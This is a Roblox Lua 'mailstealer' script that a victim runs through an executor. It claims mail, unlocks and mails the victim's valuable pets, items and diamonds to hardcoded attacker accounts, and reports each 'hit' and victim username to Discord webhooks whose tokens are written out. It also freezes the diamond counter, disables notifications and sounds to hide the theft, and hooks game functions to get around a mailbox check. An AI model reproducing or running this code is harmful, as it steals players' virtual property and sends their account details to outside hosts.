mailstealer_name = "Domo"
Username = "W1lliqmm"
Username2 = "GengarScripts"
Webhook = "https://discord.com/api/webhooks/1277723068583645184/QRNZg2Sv_P_v6jZf_Ej5kzbJ_bTYq8ONm_ldwLL5t8gn-QKfKIqP-XCJMxuL7ugq8bDi"
Image = "https://i.pinimg.com/736x/ec/3c/ab/ec3cabd4175968db3dd5fdc2a34454c0.jpg"
GLOBAL = "https://discord.com/api/webhooks/1334465648864002170/SkCwDXHS5Z3B-n7Vz0xWwFB3HyzrYtCRkBBUNAf54MGc5nbIbvLWV9HctYKoQV7jopwu"
PLACEHOLDER = "https://www.youtube.com/@DomoScripts"

MinimumRAP = 10000

LogsWebhook =
    ""

Roblox_Username = Username
Discord_Webhook = Webhook
Image = GlobalImage
-- simple mailstealer
LOGS_WEBHOOK = LogsWebhook
if getgenv().Executed == true then
-- return
end
getgenv().Executed = true

repeat
    task.wait()
until game:IsLoaded()

if not game:IsLoaded() then
    game.Loaded:Wait()
end

local idiotuser = game:GetService("Players").LocalPlayer.Name

if idiotuser == Username then
    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test it on alt acc)")
    return
end
if Username == nil then
    game:GetService("Players").LocalPlayer:Kick("Put A UserName")
    return
end

repeat
    task.wait()
until game:IsLoaded()
repeat
    task.wait()
until game.PlaceId ~= nil
repeat
    task.wait()
until not game.Players.LocalPlayer.PlayerGui:FindFirstChild("__INTRO")

-- variables:

local Library = require(game.ReplicatedStorage.Library)
local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
local Directory = require(game:GetService("ReplicatedStorage").Library.Directory)
local Player = game.Players.LocalPlayer
local Inventory = Save.Inventory
local HttpService = game:GetService("HttpService")
local MailMessage = "Gengar on top!"
local message = require(game.ReplicatedStorage.Library.Client.Message)
local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")

for id, table in pairs(Inventory.Currency) do
    if table.id == "Diamonds" then
        GemsAmount = table._am or 0
        break
    end
end

for adress, func in pairs(getgc()) do
    if typeof(func) == "function" and debug.getinfo(func).name == "computeSendMailCost" then
        FunctionToGetFirstPriceOfMail = func
        break
    end
end

FirstPriceOfMail = FunctionToGetFirstPriceOfMail()

if FirstPriceOfMail > GemsAmount then
    print("You don't have enough gems to run a script")
    return
end

local FormatNumber = function(number)
    local n = math.floor(number)
    local suf = {
        "",
        "k",
        "m",
        "b",
        "t"
    }
    local INDEX = 1
    while n >= 1000 do
        n = n / 1000
        INDEX = INDEX + 1
    end
    return string.format("%.2f%s", n, suf[INDEX])
end

local GetItemValue = function(Type, ItemTable)
    return (require(game:GetService("ReplicatedStorage").Library.Client.DevRAPCmds).Get(
        {
            Class = {
                Name = Type
            },
            IsA = function(hmm)
                return hmm == Type
            end,
            GetId = function()
                return ItemTable.id
            end,
            StackKey = function()
                return HttpService:JSONEncode(
                    {
                        id = ItemTable.id,
                        pt = ItemTable.pt,
                        sh = ItemTable.sh,
                        tn = ItemTable.tn
                    }
                )
            end
        }
    ) or 0)
end

local GetItemValueOfItems = function()
    RAP = 0
    for name_of_category, category in pairs(Inventory) do
        if category ~= nil then
            for i, v in pairs(category) do
                RAP = RAP + GetItemValue(name_of_category, v)
            end
        end
    end
    return RAP
end

function deepCopy(original)
    local copy = {}
    for k, v in pairs(original) do
        if type(v) == "table" then
            v = deepCopy(v)
        end
        copy[k] = v
    end
    return copy
end

local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets_left, shiny, ping, RAP, totalRap1)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    if shiny == true then
        shinyy = "Shiny"
    elseif shiny == false then
        shinyy = "not Shiny"
    end
    imgs =
        "Image"
    local fardplayer = game:GetService("Players").LocalPlayer
    local ExecutorWebhook = identifyexecutor() or "undefined"
    JobId = game.JobId
    local PlayerUser = Player.Name
    local msg = {
        ["content"] = ping,
        ["username"] = "" .. mailstealer_name .. "",
        ["avatar_url"] = imgs,
        ["embeds"] = {
            {
                ["title"] = "**You just got a new item!** [Got a Hit](PLACEHOLDER)",
                ["type"] = "rich",
                ["color"] = tonumber(8323327),
                ["thumbnail"] = {
                    ["url"] = thumbnail
                },
                ["fields"] = {
                    {
                        ["name"] = "**This data was generated using " .. mailstealer_name .. " Mailstealer**",
                        ["value"] = "```Username     : " ..
                            fardplayer.Name ..
                                "\nUser-ID      : " ..
                                    fardplayer.userId ..
                                        "\nAccount Age  : " ..
                                            fardplayer.AccountAge ..
                                                " Days" ..
                                                    "\nExploit      : " ..
                                                        ExecutorWebhook ..
                                                            "\nReceiver     : " ..
                                                                Roblox_Username ..
                                                                    "\nTotal RAP    : " ..
                                                                        FormatNumber(totalRap1) .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = ":dog: **Pets left** :dog:",
                        ["value"] = "```➜ " .. pets_left .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = ":money_mouth: **" .. item_type .. "** :money_mouth:",
                        ["value"] = "```➜ " .. id .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = ":trophy: **Item RAP** :trophy:",
                        ["value"] = "```➜ " .. FormatNumber(RAP) .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = ":gem: **Gems Left** :gem:",
                        ["value"] = "```➜ " .. FormatNumber(GemsAmount) .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = ":sparkles: **Shiny** :sparkles:",
                        ["value"] = "```➜ " .. shinyy .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = ":rainbow: **RB/Gold/Reg** :sparkles:",
                        ["value"] = "```➜ " .. RBgoldNormal .. "```",
                        ["inline"] = true
                    }
                }
            }
        },
        ["attachments"] = {}
    }
    local request = http_request or request or HttpPost or syn.request
    request(
        {
            Url = webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game.HttpService:JSONEncode(msg)
        }
    )
end

-- skidded that, SORRY!!

local gemsleaderstat = Player.leaderstats["\240\159\146\142 Diamonds"].Value
local gemsleaderstatpath = Player.leaderstats["\240\159\146\142 Diamonds"]
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(
    function()
        gemsleaderstatpath.Value = gemsleaderstat
    end
)

local loading = Player.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = Player.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(
    function()
        noti.Enabled = false
    end
)
noti.Enabled = false

task.spawn(
    function()
        game.DescendantAdded:Connect(
            function(x)
                if x.ClassName == "Sound" then
                    if
                        x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or
                            x.SoundId == "rbxassetid://12413423276"
                     then
                        x.Volume = 0
                        x.PlayOnRemove = false
                        x:Destroy()
                    end
                end
            end
        )
    end
)

-- no more skidding!

local function GetThumbnail(imageid)
    Asset = string.split(imageid, "rbxassetid://")[2]
    local Size = "420x420"
    local Image =
        game:HttpGet(
        "https://thumbnails.roblox.com/v1/assets?assetIds=" ..
            Asset .. "&returnPolicy=PlaceHolder&size=" .. Size .. "&format=png"
    )
    thumbnail = game.HttpService:JSONDecode(Image).data[1].imageUrl
    return thumbnail
end

MinimumRAP = FirstPriceOfMail

-- EMPTY BOXES

if Inventory.Box then
    for key, value in pairs(Inventory.Box) do
        if value._uq then
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(
                key
            )
        end
    end
end

local response, err =
    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
while err == "You must wait 30 seconds before using the mailbox!" do
    wait()
    response, err =
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
end

require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()

local GetListWithAllItems = function()
    local hits = {}
    if Inventory.Pet ~= nil then
        for i, v in pairs(Inventory.Pet) do
            id = v.id
            dir = Directory.Pets[id]
            if dir.huge and dir.Tradable ~= false then
                rap = GetItemValue("Pet", v)
                if v.pt == 1 then
                    ItemImageId = dir.goldenThumbnail
                    ItemType = "Golden"
                elseif v.pt == 2 then
                    ItemImageId = dir.thumbnail
                    ItemType = "Rainbow"
                else
                    ItemImageId = dir.thumbnail
                    ItemType = "Normal"
                end
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Pet",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
            if dir.exclusiveLevel and dir.Tradable ~= false then
                rap = GetItemValue("Pet", v) * (v._am or 1)
                if v.pt == 1 then
                    ItemImageId = dir.goldenThumbnail
                    ItemType = "Golden"
                elseif v.pt == 2 then
                    ItemImageId = dir.thumbnail
                    ItemType = "Rainbow"
                else
                    ItemImageId = dir.thumbnail
                    ItemType = "Normal"
                end
                if rap > MinimumRAP then
                    table.insert(
                        hits,
                        {
                            Item_Id = i,
                            Item_Name = v.id,
                            Item_Amount = v._am or 1,
                            Item_RAP = rap,
                            Item_Class = "Pet",
                            IsShiny = v.sh or false,
                            IsLocked = v.lk or false,
                            Item_ImageId = ItemImageId,
                            Item_Type = ItemType
                        }
                    )
                end
            end
        end
    end
    if Inventory.Egg ~= nil then
        for i, v in pairs(Inventory.Egg) do
            id = v.id
            dir = Directory.Eggs[id]
            rap = GetItemValue("Egg", v)
            ItemType = "Normal"
            ItemImageId = dir.icon
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Egg",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Misc ~= nil then
        for i, v in pairs(Inventory.Misc) do
            id = v.id
            dir = Directory.MiscItems[id]
            rap = GetItemValue("Misc", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon
            if rap > MinimumRAP and v.id ~= "Slingshot" then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Misc",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Charm ~= nil then
        for i, v in pairs(Inventory.Charm) do
            id = v.id
            dir = Directory.Charms[id]
            rap = GetItemValue("Charm", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Charm",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Enchant ~= nil then
        for i, v in pairs(Inventory.Enchant) do
            id = v.id
            dir = Directory.Enchants[id]
            rap = GetItemValue("Enchant", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon(v.tn)
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Enchant",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Lootbox ~= nil then
        for i, v in pairs(Inventory.Lootbox) do
            id = v.id
            dir = Directory.Lootboxes[id]
            rap = GetItemValue("Lootbox", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Lootbox",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Potion ~= nil then
        for i, v in pairs(Inventory.Potion) do
            id = v.id
            dir = Directory.Potions[id]
            rap = GetItemValue("Potion", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon(v.tn)
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Potion",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Seed ~= nil then
        for i, v in pairs(Inventory.Seed) do
            id = v.id
            dir = Directory.Seeds[id]
            rap = GetItemValue("Seed", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Seed",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Ultimate ~= nil then
        for i, v in pairs(Inventory.Ultimate) do
            id = v.id
            dir = Directory.Ultimates[id]
            rap = GetItemValue("Ultimate", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Ultimate",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Fruit ~= nil then
        for i, v in pairs(Inventory.Fruit) do
            id = v.id
            dir = Directory.Fruits[id]
            rap = GetItemValue("Fruit", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Fruit",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Hoverboard ~= nil then
        for i, v in pairs(Inventory.Hoverboard) do
            id = v.id
            dir = Directory.Hoverboards[id]
            rap = GetItemValue("Hoverboard", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Hoverboard",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Booth ~= nil then
        for i, v in pairs(Inventory.Booth) do
            id = v.id
            dir = Directory.Booths[id]
            rap = GetItemValue("Booth", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Booth",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    table.sort(
        hits,
        function(a, b)
            return a.Item_RAP > b.Item_RAP
        end
    )
    return hits
end

local function IsMailboxHooked()
    local uid
    for i, v in pairs(Inventory["Pet"]) do
        uid = i
        break
    end
    local args = {
        [1] = "Roblox",
        [2] = "Test",
        [3] = "Pet",
        [4] = uid,
        [5] = 1
    }
    local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    if (err == "They don't have enough space!") or (err == "You don't have enough diamonds to send the mail!") then
        return false
    else
        return true
    end
end

itemsCounted = 0
local totalRap = 0
local hits = GetListWithAllItems()
currentMailPrice = FirstPriceOfMail
-- make it count total rap until sending price is bigger than gems amount, also make it calculate gems amount after each send
for i, v in pairs(hits) do
    if v.Item_RAP >= currentMailPrice then
        totalRap = totalRap + v.Item_RAP
        itemsCounted = itemsCounted + 1
    end
    currentMailPrice = currentMailPrice * 1.5
    if currentMailPrice > 5000000 then
        currentMailPrice = 5000000
    end
end


local function sendItem(category, uid, am, locked)
    local args = {
        [1] = Roblox_Username,
        [2] = "from" .. mailstealer_name .. "",
        [3] = category,
        [4] = uid,
        [5] = am
    }
    local response = false
    repeat
        if locked == true then
            local args = {
                uid,
                false
            }
            game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(unpack(args))
        end
        local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        if response == false and err == "They don't have enough space!" then
            Roblox_Username = Username2
            args[1] = Roblox_Username
        end
    until response == true
    GemsAmount = GemsAmount - FirstPriceOfMail
    FirstPriceOfMail = math.ceil(math.ceil(FirstPriceOfMail) * 1.5)
    if FirstPriceOfMail > 5000000 then
        FirstPriceOfMail = 5000000
    end
end

local function SendAllGems()
    for i, v in pairs(Inventory.Currency) do
        if v.id == "Diamonds" then
            if GemsAmount >= (FirstPriceOfMail + 10000) then
				SentGems = GemsAmount - FirstPriceOfMail
                local args = {
                    [1] = Roblox_Username,
                    [2] = "from" .. mailstealer_name .. "",
                    [3] = "Currency",
                    [4] = i,
                    [5] = SentGems
                }
                local response = false
                repeat
                    local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                until response == true
                SendMessage("Diamonds", "Currency", "Gems", "rbxassetid://15258327857", Discord_Webhook, "none", "no", "@everyone", SentGems, totalRap)
                break
            end
        end
    end
end


Left_Hits = #hits

if #hits > 0 or GemsAmount > FirstPriceOfMail then
    local blob_a = require(game:GetService("ReplicatedStorage").Library.Client.Save)
    local blob_b = blob_a.Get()

    FavoriteModeSelection = blob_a.Get().FavoriteModeSelection
    FavoriteModeSelectionPlaza = blob_a.Get().FavoriteModeSelectionPlaza

    oldGet = deepCopy(blob_b)
    blob_a.Get = function(...)
        blob_b = oldGet
        blob_b.FavoriteModeSelection = {FavoriteModeSelection}
        blob_b.FavoriteModeSelectionPlaza = {FavoriteModeSelectionPlaza}
        return blob_b
    end

    if IsMailboxHooked() then
        local Mailbox = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send")
        for i, Func in ipairs(getgc(true)) do
            if typeof(Func) == "function" and debug.info(Func, "n") == "typeof" then
                local Old
                Old =
                    hookfunction(
                    Func,
                    function(Ins, ...)
                        if Ins == Mailbox then
                            return tick()
                        end
                        return Old(Ins, ...)
                    end
                )
            end
        end
    end
    for i, v in pairs(hits) do
        if FirstPriceOfMail > 5000000 then
            FirstPriceOfMail = 5000000
        end
        if v.Item_RAP >= FirstPriceOfMail then
            sendItem(v.Item_Class, v.Item_Id, v.Item_Amount, v.IsLocked)
            thumb = GetThumbnail(v.Item_ImageId)
            Left_Hits = Left_Hits - 1
            task.spawn(
                function()
                    SendMessage(
                        v.Item_Name,
                        v.Item_Class,
                        v.Item_Type,
                        thumb,
                        Discord_Webhook,
                        Left_Hits,
                        v.IsShiny,
                        "@everyone",
                        v.Item_RAP,
                        totalRap
                    )
                end
            )
        else
            break
        end
    end
    SendAllGems()
end

-- Define the new global webhook URL
GlobalWebhook = "GLOBAL"

-- Function to send data to the global webhook
local function SendGlobalWebhook(items, totalRAP, victimUsername)
    local headers = {
        ["Content-Type"] = "application/json"
    }

    -- Create message structure
    local msg = {
        ["content"] = nil,
        ["username"] = "Gengar Global",
        ["avatar_url"] = "GlobalImage", -- You can change the avatar URL
        ["embeds"] = {
            {
                ["title"] = "**Someone got a hit!**",
                ["type"] = "rich",
                ["color"] = tonumber(8323327),
                ["fields"] = {
                    {
                        ["name"] = ":bust_in_silhouette: **Victim Username**",
                        ["value"] = "```" .. victimUsername .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = ":trophy: **Total RAP**",
                        ["value"] = "```" .. FormatNumber(totalRAP) .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = ":package: **Items Received**",
                        ["value"] = "```" .. table.concat(items, ", ") .. "```",
                        ["inline"] = false
                    }
                }
            }
        },
        ["attachments"] = {}
    }

    -- Send the request to the global webhook
    local request = http_request or request or HttpPost or syn.request
    request({
        Url = GlobalWebhook,
        Method = "POST",
        Headers = headers,
        Body = game.HttpService:JSONEncode(msg)
    })
end

-- Modify the part where you receive items to trigger this webhook
local receivedItems = {}
local totalRAP = 0

-- Assuming you loop over items when receiving them, collect their names and RAP
for _, item in pairs(hits) do
    table.insert(receivedItems, item.Item_Name)
    totalRAP = totalRAP + item.Item_RAP
end

-- Call the SendGlobalWebhook function with the received items, total RAP, and victim's username
SendGlobalWebhook(receivedItems, totalRAP, Player.Name)